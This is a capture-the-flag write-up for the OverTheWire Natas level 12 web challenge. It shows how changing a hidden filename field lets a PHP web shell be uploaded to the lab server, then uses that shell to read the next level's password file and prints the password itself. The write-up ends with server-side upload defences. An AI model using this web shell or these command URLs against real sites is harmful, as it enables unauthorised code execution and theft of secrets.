# 🕵️ Natas - Level 12 (🇺🇸 English)  
*Date: 2025-06-03*  
*Difficulty: Medium*  
*Category: Web*   

---

## 🎯 Objective

The objective of this challenge is to identify and exploit a file upload vulnerability that allows client-side filename manipulation, resulting in Remote Code Execution (RCE) to obtain the next level password (Natas13).  

---

## 🔎 Analysis

- The web application at `http://natas12.natas.labs.overthewire.org/` offers a JPEG image upload functionality with a 1KB size limit.  
- Common extension bypass attempts (e.g. `.php.jpg`, `test.php%00.jpg` - null byte) did not work, as the server always appends `.jpg` to the final filename, invalidating execution as PHP.  
- Analysis of the HTML page's source code revealed a hidden field in the upload form: `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`.  
- This hidden field pre-defines the name of the file that will be saved on the server, including the `.jpg` extension, before the user even selects the file for upload.  
- The vulnerability lies in the fact that the final file name is controlled by a pre-populated value on the client side (via the `hidden` field), which can be intercepted and manipulated.  
- Our goal is to change the extension from `.jpg` to `.php` in the `filename` field of the HTTP request so that the server saves our file with the correct extension.  
- The payload to be sent will be a simple PHP shell: `<?php system($_GET['cmd']); ?>`, allowing the execution of commands via the `cmd` parameter in the URL.
  
---

## 🧱 Steps

1. Access the Application: Navigate to `http://natas12.natas.labs.overthewire.org/`.   
2. Test the Upload: Try to upload a file to observe the server behavior (renaming it to `.jpg`).   
3. Analyze the Source Code: Inspect the HTML code of the upload page to identify the `input type="hidden" name="filename"` field.   
4. Prepare the Payload: Create a PHP file (e.g. `bypass.php`) with the content `<?php system($_GET['cmd']); ?>`.   
5. Intercept the Request: Using the `Burp Suite` proxy tool to capture the file upload request.  
6. Manipulate the File Name: In the intercepted request, locate the `filename` parameter and change its extension to `.php` (ex: c36r0bea02.jpg to c36r0bea02.php).  
7. Send the Request: Send the modified request to the server.  
8. Verify Upload: The server will return a message confirming the upload of the file with the .php extension (e.g.: The file `upload/dnfplwi4tz.php` has been uploaded).  
9. Access the Web Shell: Navigate to the URL of the newly uploaded PHP file (e.g.: `http://natas12.natas.labs.overthewire.org/upload/dnfplwi4tz.php`). Observe the error messages ("Notice: Undefined index: cmd", "Warning: system(): Cannot execute a blank command"), which confirm that PHP is interpreting the file.  
10. Run Commands: Test the execution of commands by adding the cmd parameter to the URL (e.g. `http://natas12.natas.labs.overthewire.org/upload/dnfplwi4tz.php?cmd=pwd`). Confirm the RCE.  
11. Get the Password: Run the command to read the Natas13 password file: `http://natas12.natas.labs.overthewire.org/upload/dnfplwi4tz.php?cmd=cat%20/etc/natas_webpass/natas13`.

---

## 🔑 Password Found

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

---

## ✅ Conclusion

The vulnerability was successfully exploited by manipulating the filename field of a hidden input in the upload form, which was filled out on the client side. This allowed bypassing server-side extension validation and uploading from a PHP shell. Remote code execution was confirmed and the password for the next level was obtained. This case highlights the danger of relying on any type of client-side input control for application security, especially for upload functionality.

---

## 🧪 Commands Used


Access to web shell (after upload and name manipulation):   
`http://natas12.natas.labs.overthewire.org/upload/[random_name].php`   
Verify RCE:  
`http://natas12.natas.labs.overthewire.org/upload/[random_name].php?cmd=pwd`    
Get Natas13 password:  
`http://natas12.natas.labs.overthewire.org/upload/[random_name].php?cmd=cat%20/etc/natas_webpass/natas13`    

---

## 🧠 Observations

- Server-Side Validation is Crucial: Never rely on client-side validations (JavaScript, hidden HTML fields). Always re-validate all input on the server side.   
- Whitelist for Extensions and MIME Types: Instead of blacklists, use whitelists for file extensions and MIME types allowed for upload.   
- Secure File Renaming: When renaming files, use a randomly generated name and a server-validated extension, without allowing any user input in the final name or extension.   
- Upload Isolation: Files uploaded by users should be stored in a directory outside the web root or configured to not allow script execution.  

---

## 📎 Scripts Developed

[bypass.php](https://github.com/ItacarambiSec/Projects/blob/main/Ctf-scripts/Overthewire_natas/bypass.md): A simple PHP shell (`<?php system($_GET['cmd']); ?>`) used for remote command execution.

---

<p align="center"> <a href="../Natas11/Readme.md">⬅️ Previous</a> • <a href="../Natas13/Readme.md">Next ➡️</a> </p>
